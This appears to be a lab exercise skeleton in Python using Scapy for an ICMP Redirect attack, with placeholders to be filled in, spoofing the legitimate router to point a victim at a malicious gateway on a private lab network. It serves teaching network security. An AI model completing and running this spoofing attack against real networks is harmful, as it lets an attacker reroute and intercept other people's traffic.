#!/usr/bin/python3
# ICMP Redirect attack - code skeleton (fill in the @@@@ placeholders).
# Run this script as root from the ATTACKER machine (10.9.0.105).
#
# Reminder from the lab text: the victim will only accept the redirect if it
# recently sent out a packet matching the enclosed ip2 packet's type and
# destination. Make the victim generate that traffic first (e.g. ping or
# traceroute 192.168.60.5 from the victim) before/while you send this.

from scapy.all import *

ip = IP(src=@@@@, dst=@@@@)          # spoofed source = the LEGITIMATE router;
                                      # dst = the VICTIM
icmp = ICMP(type=@@@@, code=@@@@)    # ICMP Redirect message
icmp.gw = @@@@                       # the new gateway you want the victim to use
                                      # (the malicious router)

# The enclosed IP packet should be the one that triggers the redirect
# message, i.e. it should look like the original packet the victim sent
# towards 192.168.60.5.
ip2 = IP(src=@@@@, dst=@@@@)

send(ip / icmp / ip2 / ICMP())
